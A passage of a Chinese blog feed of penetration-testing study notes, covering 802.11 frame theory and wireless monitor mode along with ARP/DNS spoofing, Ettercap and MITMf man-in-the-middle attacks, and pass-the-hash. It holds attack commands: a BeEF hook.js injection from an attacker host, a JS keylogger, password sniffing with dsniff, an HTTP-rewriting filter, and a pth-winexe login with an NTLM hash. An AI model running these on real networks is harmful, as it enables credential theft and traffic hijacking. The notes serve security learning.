        <content type="html"><![CDATA[<h4 id="802-11协议栈"><a href="#802-11协议栈" class="headerlink" title="802.11协议栈"></a><strong>802.11协议栈</strong></h4><p>leee 80211<br>    iwconfig<br>    iwlist<br>mac80211<br>    iw</p><h4 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a><strong>查看无线网卡</strong></h4><pre><code>ifconfigiwconfigiw list</code></pre><h4 id="信道频率"><a href="#信道频率" class="headerlink" title="信道频率"></a><strong>信道频率</strong></h4><pre><code>iwlist wlan2 frequencyiw list</code></pre><h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a><strong>扫描附近AP</strong></h4><pre><code>iw dev wlan2 scan | grep SSIDiw dev wlan2 scan | egrep &quot;DS\ Parameter\ set | SSID&quot;    #扫描查看附近AP信道iwlist wlan2 scanning | egrep &quot;ESSID | Channel&quot;            #扫描查看附近AP信道及频宽</code></pre><p>log(signal/1mW)        #singnal无线强度接收值计算,0~-50 信号好,超过-130信号不可达</p><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a><strong>添加删除侦听端口</strong></h4><pre><code>iw dev wlan2 interface add wlan2mon type monitor    #把无线网卡设置成monitor模式,进行无线数据抓包tcpdump -s 0 --i wlan2mon -p                    #tcpdump命令行抓包工具ifconfig wlan2mon up            #把wlan2mon设置成up状态service network-manager stop    #如果up不成功,停用network-manager服务service network-manager status    #network-manager服务状态查询vi ./bashrc                        #服务启动项配置iw dev wlan2mon interface del</code></pre><h5 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h5><p>协议栈<br>    <a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a><br>无线驱动<br>    <a href="http://linuxwireless.org/en/users/Drivers/" target="_blank" rel="noopener">http://linuxwireless.org/en/users/Drivers/</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线协议 </tag>
            
            <tag> Monitor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线数据帧Management Frame原理</title>
      <link href="/2015/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/"/>
      <url>/2015/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/</url>
      
        <content type="html"><![CDATA[<h4 id="Management-Frame-管理帧"><a href="#Management-Frame-管理帧" class="headerlink" title="Management Frame(管理帧)"></a><strong>Management Frame(管理帧)</strong></h4><p>用于协商和控制STA与AP之间的关系</p><h4 id="Beacon-Frames-是由AP发出来的帧"><a href="#Beacon-Frames-是由AP发出来的帧" class="headerlink" title="Beacon Frames(是由AP发出来的帧)"></a><strong>Beacon Frames(是由AP发出来的帧)</strong></h4><p>AP发送的广播帧,通告无线网络的存在(BSSID)<br>发包频率<br>    102.4ms(可变)<br>    时间单位1024microsecond(60秒)<br><strong>SSID网络名</strong><br>隐藏AP不发SSID广播<br><strong>IBSSI Status</strong></p><ul><li>0:intrastructure</li><li>1:ad-hcc<br>Privicy</li><li>WEP\WPA加密<br>ESSID</li><li>名称,长度<br>速率</li><li>802.11 g(1–54Mbit)<br>信道</li><li>11</li></ul><h4 id="Probe-Request-Frames-由STA发出的扫描请求帧"><a href="#Probe-Request-Frames-由STA发出的扫描请求帧" class="headerlink" title="Probe Request Frames(由STA发出的扫描请求帧)"></a><strong>Probe Request Frames(由STA发出的扫描请求帧)</strong></h4><p>用于STA扫描现有AP<br>    发现连接过的AP<br>    发现未连接过的AP</p><h4 id="Probe-Response-Frames-由AP返回的响应帧"><a href="#Probe-Response-Frames-由AP返回的响应帧" class="headerlink" title="Probe Response Frames(由AP返回的响应帧)"></a><strong>Probe Response Frames(由AP返回的响应帧)</strong></h4><p>发现连接过的AP时,速率和ESSID相同的AP响应</p><h4 id="Authentication-Frames-身份认证"><a href="#Authentication-Frames-身份认证" class="headerlink" title="Authentication Frames(身份认证)"></a><strong>Authentication Frames(身份认证)</strong></h4><p>Authentication Algorithm身份认证类型<br>0:开放系统身份验证<br>1:共享密钥身份验证<br>身份认证由多个帧交换过程组成<br>Authentication Seq<br>    每次身份验证过程Seq唯一<br>    1-65535<br>Challenge text<br>    只有共享密钥方式才有此字段<br>Status Code:成功/失败</p><h4 id="Association-Reassociation-Frames-关联-重关联帧"><a href="#Association-Reassociation-Frames-关联-重关联帧" class="headerlink" title="Association/Reassociation Frames(关联/重关联帧)"></a><strong>Association/Reassociation Frames(关联/重关联帧)</strong></h4><p>身份验证成功后,STA执行关联操作,加入无线网络<br>    Association Request    Frames<br>    Reassociation Request Frames<br>    Association Response Frames</p><h4 id="isassociation-Deauthentication-由AP发出"><a href="#isassociation-Deauthentication-由AP发出" class="headerlink" title="isassociation/Deauthentication(由AP发出)"></a><strong>isassociation/Deauthentication(由AP发出)</strong></h4><p>由AP发出<br>    2个字节</p><h4 id="ATIM-Frames"><a href="#ATIM-Frames" class="headerlink" title="ATIM Frames"></a><strong>ATIM Frames</strong></h4><p>只在ad-hoc网络下使用<br>    STA使用此帧通知接收者其有缓存的数据要发送</p><h4 id="Data-Frames-数据帧"><a href="#Data-Frames-数据帧" class="headerlink" title="Data Frames(数据帧)"></a><strong>Data Frames(数据帧)</strong></h4><p>传输用户数据<br>    DATA Frame</p><h4 id="空数据帧"><a href="#空数据帧" class="headerlink" title="空数据帧"></a><strong>空数据帧</strong></h4><p>Null data frame<br>只包含MAC头和FCS<br>STA用于声明自己将要进入省电模式</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线数据帧 </tag>
            
            <tag> 管理帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 嗅探欺骗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arpspoof </tag>
            
            <tag> Mitmf </tag>
            
            <tag> XSS </tag>
            
            <tag> dnsspoof </tag>
            
            <tag> beef </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ettercap中间人攻击</title>
      <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a><strong>Ettercap</strong></h3></blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击<h4 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a><strong>模块划分</strong></h4></li><li>Snifer</li><li>MITM</li><li>Filter</li><li>Log </li><li>Plugin</li></ul><h5 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a><strong>Snifer</strong></h5><p>负责数据包转发<br><strong>Unified</strong></p><ul><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li><li><em>Bridge*</em></li><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用(透明网桥)<h5 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h5></li><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><em>实现MITM的方法*</em></li><li>ARP</li><li>ICMP<br>  ICMP路由重定向，半双工</li><li>DHCP<br>  修改网关地址,半双工<br>  Switch Port Stealing    #交换机端口窃取<br>  flood目标地址是本机，源地址是受害者的包<br>  适用于ARP静态绑定的环境</li><li>NDP<br>  IPv6协议欺骗技术</li></ul><p><strong>2.4以上内核对ARP地址欺骗的约束</strong></p><ul><li>收到非请求的ARP响应包，不更新本地ARP缓存</li><li>Ettercap使用ARP request包进行攻击</li><li><em>Solaris 不根据ARP包更新本地ARP缓存*</em></li><li>Ettercap使用先发ICMP包来更新ARP缓存</li></ul><p><strong>用户操作界面</strong><br>    -T 字符模式界面<br>    -G 图形界面<br>    -C 基于字符的图形界面<br>    -D 后台模式</p><p><strong>指定目标</strong></p><pre><code>IPv4：MAC/IPs/PortsIPv6：MAC/IPs/IPv6/Ports/10.0.0.1-5;10.0.1.33/20-25,80,110</code></pre><p><strong>权限</strong></p><ul><li>需要root权限打开链路层Socket连接,然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534        #改为0</li></ul><p><strong>基于伪造证书的SSL MITIM</strong></p><pre><code>Bridge模式不支持SSL MITM 需要生成SSL证书openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new&gt;&gt;etter.ssl.crtrm −f tmp.newtmp.csr</code></pre><h3 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a><strong>ARP MITM</strong></h3><p><strong>字符模式</strong></p><pre><code>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></pre><p><strong>图形界面</strong></p><h5 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a><strong>SSL MITM</strong></h5><p><code>vi /etc/ettercap/etter.conf</code></p><h5 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a><strong>DNS欺骗</strong></h5><p>dns_spoof插件配置文件<br>    <code>vi /etc/ettercap/etter.dns</code></p><h4 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a><strong>Ettercap 日志查看</strong></h4><pre><code>etterlog -p log.eci     #查看获取的密码etterlog -c log.ecp     #列出Log中的连接etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa     #选择相应的连接并榨取文件</code></pre><h4 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter    过滤器"></a><strong>Filter</strong>    过滤器</h4><pre><code>ls /usr/share/ettercap/SSH-2.xx / SSH-1.99 / SSH-1.51etterfilter etter.filter.ssh -o ssh.ef        #编译可执行二进制文件,-F 作SSH嗅探</code></pre><h5 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h5><ul><li>替换图片</li><li>替换exe后门程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123;</span><br><span class="line">msg(&quot;data on TCP 80\n&quot;);</span><br><span class="line">replace(&quot;img src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG SRC&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="ICMP-中间人攻击"><a href="#ICMP-中间人攻击" class="headerlink" title="ICMP 中间人攻击"></a><strong>ICMP 中间人攻击</strong></h4><pre><code>-M icmp:00:11:22:33:44:55/10.0.0.1        #真实网关的MAC/IP</code></pre><h4 id="DHCP-中间人攻击"><a href="#DHCP-中间人攻击" class="headerlink" title="DHCP 中间人攻击"></a><strong>DHCP 中间人攻击</strong></h4><pre><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1        #DNS </code></pre><h4 id="Port-基于交换机端口窃取的中间人攻击"><a href="#Port-基于交换机端口窃取的中间人攻击" class="headerlink" title="Port 基于交换机端口窃取的中间人攻击"></a><strong>Port 基于交换机端口窃取的中间人攻击</strong></h4><pre><code>-M port /1.1.1.1/ /1.1.1.2/</code></pre><h4 id="Ndp-IPv6协议欺骗中间人攻击"><a href="#Ndp-IPv6协议欺骗中间人攻击" class="headerlink" title="Ndp IPv6协议欺骗中间人攻击"></a><strong>Ndp</strong> IPv6协议欺骗中间人攻击</h4><pre><code>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</code></pre><h3 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a><strong>Pass the Hash</strong> (PTH)</h3><ul><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li></ul><h4 id="利用sam-hash密文远程登录windows"><a href="#利用sam-hash密文远程登录windows" class="headerlink" title="利用sam hash密文远程登录windows"></a><strong>利用sam hash密文远程登录windows</strong></h4><pre><code>pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8 //1.1.1.1 cmd</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 嗅探欺骗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arpspoof </tag>
            
            <tag> dnsspoof </tag>
            
            <tag> Ettercap </tag>
            
            <tag> PTH </tag>
            
            <tag> 中间人攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线数据帧Control Frame原理</title>
      <link href="/2015/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/"/>
      <url>/2015/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Control-Frame-控制帧"><a href="#Control-Frame-控制帧" class="headerlink" title="Control Frame(控制帧)"></a>Control Frame(控制帧)</h3><p>控制帧是一些通知设备开始,停止传输或连接失败等情况的短消息;</p></blockquote><h4 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a><strong>ACK</strong></h4><p>接收端正确接收数据之后向发送端返回ACK确认<br>每个单播帧需要ACK立刻确认<br>    组播和广播不需要ACK确认<br>尽快响应<br>    由硬件完成,而非驱动层<br>T/S:1/13</p><h4 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a><strong>PS-POLL</strong></h4><p>RF系统的放大器<br>    主要耗电的组件<br>    发射前放大信号,接收并放大还原信号<br>省电模式<br>    关闭信号发射器节省电源耗电(几乎完全关闭)</p><h4 id="AID—-Association-ID"><a href="#AID—-Association-ID" class="headerlink" title="AID—-Association ID"></a><strong>AID—-Association ID</strong></h4><p>STA省电模式唤醒<br>    数据发送至AP(AP缓存数据包)<br>    通过Beacon发送TIM(traffic indication map)<br>        其中包含AID<br>    STA对比AID后唤醒网卡<br>    STA发送PS-Poll帧,请求从AP缓存中取回数据<br>        每个帧都需要ACK确认<br>        ACK确认完后AP从缓存中删除数据帧<br>        传输过程中STA保持唤醒状态<br>        传输结束后STA恢复省电状态</p><h4 id="AP接收PS-Poll帧"><a href="#AP接收PS-Poll帧" class="headerlink" title="AP接收PS-Poll帧"></a><strong>AP接收PS-Poll帧</strong></h4><p>立刻响应<br>延迟响应<br>    简单响应帧</p><ul><li>AID:关联ID</li><li>BSSID:STA正关联的AP地址</li><li>TA:发送此帧的STA地址</li></ul><h4 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a><strong>RTS/CTS</strong></h4><p>RTS/CTS是CSMA/CA方法的一种补充手段<br>    降低冲突产生的可能性<br>    正式通信之前通过请求应答机制,确信通信介质的可用性<br>    并锁定传输介质和预约通信时间<br>    只有在传输长帧时使用,传输短帧时不会使用<br>        驱动接口提供阈值的自定义<br>        大于阈值的帧被视为长帧,反之则视为短帧.<br>    Node1发送Request to Send包给Node2<br>    如果未发生冲突,Node2返回Clear to Send给Node1<br>    Node1传输数据<br>    数据正常接收,Node2返回ACK,否则Node1什么也不会收到.<br>有线网络介质访问方式:CSMA/CD<br>无线网络介质访问方法:CSMA/CA<br>隐藏节点<br>RTS帧长度20字节<br>CTS帧长度14字节</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线数据帧 </tag>
            
            <tag> ACK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ARP和DNS欺骗实现流量劫持密码嗅探</title>
      <link href="/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
      <url>/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="ARP欺骗-网络密码嗅探"><a href="#ARP欺骗-网络密码嗅探" class="headerlink" title="ARP欺骗-网络密码嗅探"></a><strong>ARP欺骗-网络密码嗅探</strong></h3></blockquote><p><strong>二层地址和三层地址</strong> MAC硬件地址&amp;IP地址</p><ul><li>IP 网络到网络</li><li>MAC 主机到主机</li></ul><h4 id="交换机与HUB"><a href="#交换机与HUB" class="headerlink" title="交换机与HUB"></a><strong>交换机与HUB</strong></h4><ul><li>交换机是二层设备,HUB是一层设备</li><li>HUB全端口转发</li><li>交换机根据学习地址转发</li><li>混杂模式抓包</li></ul><h4 id="ARP协议-地址解析协议"><a href="#ARP协议-地址解析协议" class="headerlink" title="ARP协议 地址解析协议"></a><strong>ARP协议</strong> 地址解析协议</h4><ul><li>把IP地址解析对应的MAC地址</li><li>免费ARP</li><li>基于广播学习</li><li>以太网头、ARP头</li><li>请求 <strong>响应</strong> 相对独立</li><li>基于传闻的协议</li><li>手动修改数据包实现ARP欺骗</li></ul><h4 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a><strong>arpspoof</strong></h4><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward         #开启路由转发功能,使被欺骗者可上网arpspoof -t 1.1.1.12 -r 1.1.1.1            #欺骗用户和网关,双向欺骗实现中间人攻击</code></pre><h4 id="网络抓包嗅探"><a href="#网络抓包嗅探" class="headerlink" title="网络抓包嗅探"></a><strong>网络抓包嗅探</strong></h4><pre><code>driftnet -i eth0 -a -d tempdir -s        #抓包还原图片和音频并保存指定目录urlsnarf -i eth0                        #嗅探urlwebspy -i eth0 1.1.1.10                    #嗅探url,工具有BUGdsniff -i eth0 -m                        #嗅探密码    cat /usr/share/dsniff/dsniff.services    #查看支持协议类型解码dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts        #dns欺骗</code></pre><h4 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a><strong>DNS欺骗代理</strong></h4><pre><code>dnschef --fakeip=1.1.1.10 -fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2 -q将被害者DNS指向伪造的DNS服务器</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 嗅探欺骗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arpspoof </tag>
            
            <tag> dsniff </tag>
            
            <tag> dnsspoof </tag>
            
            <tag> driftnet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线网络运行模式</title>
      <link href="/2015/05/25/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/"/>
      <url>/2015/05/25/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="无线网络架构"><a href="#无线网络架构" class="headerlink" title="无线网络架构"></a><strong>无线网络架构</strong></h4></blockquote><p>Infrastructure    // 基础架构模式<br>    AP 维护SSID<br>Ad-Hoc<br>    STA维护SSID<br>Service Set Identifier(SSID)<br>    AP每秒钟约10次通过Beacon帧广播SSID<br>    客户端连接到无线网络后也会宣告SSID</p><h5 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a><strong>Infrastructure</strong></h5><p>至少包含一个AP和一个Station,形成一个Basic Service Set(BSS)<br>AP连接到有线网络,称为Distribution System(DS)<br>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</p><h5 id="AD-HOC"><a href="#AD-HOC" class="headerlink" title="AD-HOC"></a><strong>AD-HOC</strong></h5><p>也被称为Independent Basic Service Set(BISS) #独立的架构模式<br>有至少2个Station直接通信组成<br>也称为peer to peer模式        //点到点<br>其中一个STA负责AP的工作<br>    通过beacon广播SSID<br>    对其它STAs进行身份验证</p><h5 id="WIRELESS-DISTRIBUTION-SYSTEM-WDS"><a href="#WIRELESS-DISTRIBUTION-SYSTEM-WDS" class="headerlink" title="WIRELESS DISTRIBUTION SYSTEM(WDS)"></a><strong>WIRELESS DISTRIBUTION SYSTEM(WDS)</strong></h5><p>与有线DS类似,只是通过无线连接的多个AP组成的网络<br>Bridging—-只有AP间彼此通信        // 桥接<br>Repeating—-允许所有AP和STA进行通信        // 中继</p><h5 id="Monitor-Mode"><a href="#Monitor-Mode" class="headerlink" title="Monitor Mode"></a><strong>Monitor Mode</strong></h5><p>Monitor不是一种真的无线模式<br>但是对无线渗透至关重要<br>允许无线 网上没有任何筛选的抓包(802.11包头)<br>与有线网络的混杂模式可以类比<br>适合的网卡和驱动但不可以monitor,更可以Injection</p><p>无线网硬件设备及基本概念<br>无线网卡准备<br>物理机运行kali<br>虚拟机运行kali<br>外置USB无线网卡<br>TL-WN722N(个人建议)</p><pre><code>dmesg -T    // 显示系统硬件设备使用纪录iwconfig    // 无线网卡配置查询</code></pre><h5 id="选择无线网卡"><a href="#选择无线网卡" class="headerlink" title="选择无线网卡"></a><strong>选择无线网卡</strong></h5><p>这是个痛苦和受挫的过程<br>无线网卡的芯片型号是成败的关键<br>台式机<br>    USB无线网卡(不支持扩展天线)<br>    PCMCIA(16Bit已停产802.11b)<br>    Cardbus(32bit PCMCIA 8.0标准)<br>    Express Cards<br>    MiniPCI<br>    MiniPCI Express<br>    PCI接口卡<br>发送功率:远程连接<br>接收灵敏性:适当降低灵敏度,接收效果更佳<br>经验但不是铁律<br>    Atheros或Realtek芯片<br>    没有神器<br>    兼容aircrack-ng suite<br><a href="http://www.aircrack-ng.org/" target="_blank" rel="noopener">http://www.aircrack-ng.org/</a><br>无线渗透网卡没有所谓的标准,但是Aircrack-ng suite作者给出建议<br>Alfa Networks AWUS036H无线网卡<br>    Realtek 8187芯片<br>    1000 mW发送功率<br>    天线:RP-SMA<br>        可扩展</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Monitor </tag>
            
            <tag> 无线模式 </tag>
            
            <tag> WDS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信过程</title>
      <link href="/2015/05/24/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/"/>
      <url>/2015/05/24/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/</url>
      
